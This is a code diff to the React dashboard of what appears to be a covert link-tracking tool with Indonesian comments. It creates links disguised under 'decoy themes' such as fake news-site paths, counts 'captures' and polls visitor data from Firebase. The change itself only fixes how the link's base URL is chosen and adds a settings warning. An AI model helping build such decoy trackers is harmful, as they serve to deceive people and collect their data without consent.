@@ -31,8 +31,12 @@ export default function Dashboard() {
   const [settingsSaved, setSettingsSaved] = useState(false);
 
 
-  // Gunakan custom domain jika diset di settings, fallback ke Vercel URL
-  const base = (settings.customDomain || '').replace(/\/+$/, '') || window.location.origin;
+  // Base URL untuk generate link — JANGAN pakai localhost
+  // Pakai custom domain jika ada, atau ambil dari env var Vercel, atau tanya user
+  const deployedOrigin = import.meta.env.VITE_APP_URL ||
+    (window.location.hostname === 'localhost' ? '' : window.location.origin);
+  const base = (settings.customDomain || '').replace(/\/+$/, '') || deployedOrigin;
+  const isLocalhost = window.location.hostname === 'localhost';
   const totalCaptures = links.reduce((a, l) => a + (l.captures?.length || 0), 0);
 
   // ─── Sinkronisasi Firebase: tarik data visitor setiap 15 detik ───
@@ -72,9 +76,13 @@ export default function Dashboard() {
   }
 
   function handleCreate() {
+    if (!base) {
+      alert('⚠️ Isi dulu "URL Aplikasi" di Settings agar link yang dibuat benar!');
+      setShowSettings(true);
+      return;
+    }
     const link = createLink({ name: linkName.trim() || undefined, decoyTheme: decoy, ...feats });
     setLinks(getLinks());
-    // URL bertema: /berita/info-terkini/{encoded}
     setGenUrl(`${base}/${link.themePath}/${link.encoded}`);
     setLinkName('');
     setExpandedId(link.id);
@@ -148,25 +156,23 @@ export default function Dashboard() {
         <div className="settings-panel">
           <div className="settings-inner">
 
-            {/* Custom Domain */}
-            <div className="settings-block">
-              <div className="settings-block-title">
-                🌐 Domain Link
-                <span className="settings-help" style={{ cursor: 'default' }}>
-                  Domain yang tampil di link tracking
-                </span>
+            {/* URL Aplikasi — WAJIB agar link yang dibuat benar */}
+            <div className="settings-block" style={{ border: isLocalhost ? '1px solid #ef4444' : '1px solid rgba(255,255,255,0.1)', borderRadius: '10px', padding: '12px', background: isLocalhost ? 'rgba(239,68,68,0.07)' : 'transparent' }}>
+              <div className="settings-block-title" style={{ color: isLocalhost ? '#f87171' : undefined }}>
+                🔗 URL Aplikasi Vercel
+                {isLocalhost && <span className="settings-help" style={{ color: '#f87171' }}>⚠ Wajib diisi saat di localhost!</span>}
               </div>
               <div className="settings-row">
                 <input
                   className="settings-input"
-                  placeholder="Kosongkan = pakai Vercel URL otomatis"
+                  placeholder="https://tracker-xxxx.vercel.app"
                   value={settings.customDomain || ''}
                   onChange={e => setSettings(s => ({ ...s, customDomain: e.target.value.trim() }))}
                 />
               </div>
               <div className="settings-hint">
-                Contoh: <code>https://beritaviral.my.id</code> atau <code>https://s.id</code>
-                &nbsp;— Setelah simpan, link baru akan pakai domain ini
+                Isi dengan URL Vercel kamu (cek di <a href="https://vercel.com/dashboard" target="_blank" rel="noreferrer">vercel.com/dashboard</a>).
+                Kosongkan jika sudah buka dashboard dari Vercel URL langsung.
               </div>
             </div>
 
